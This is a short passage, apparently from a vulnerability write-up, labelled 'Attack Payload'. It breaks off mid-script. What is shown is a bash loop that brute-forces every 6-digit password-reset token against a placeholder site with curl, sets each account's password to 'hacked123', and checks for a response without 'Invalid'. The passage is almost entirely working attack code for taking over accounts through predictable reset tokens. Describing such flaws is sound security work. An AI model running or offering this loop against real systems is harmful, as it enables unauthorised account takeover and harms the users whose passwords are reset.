**Attack Payload**:
```bash
# Brute force predictable 6-digit tokens
for token in $(seq 000000 999999); do
    response=$(curl -s "http://example.com/reset?token=$token&newPassword=hacked123")
    if [[ $response != *"Invalid"* ]]; then
